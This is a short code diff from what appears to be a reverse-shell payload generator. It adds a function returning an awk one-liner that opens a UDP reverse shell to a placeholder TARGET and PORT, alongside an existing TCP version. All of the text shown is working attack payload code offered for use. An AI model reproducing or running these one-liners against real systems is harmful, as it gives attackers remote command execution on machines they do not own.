@@ -56,3 +56,6 @@ def REVERSE_SOCAT():
 
 def REVERSE_AWK():
 	return """awk 'BEGIN {s = "/inet/tcp/0/TARGET/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
+
+def REVERSE_AWK_UDP():
+        return """awk 'BEGIN {s = "/inet/udp/0/TARGET/PORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
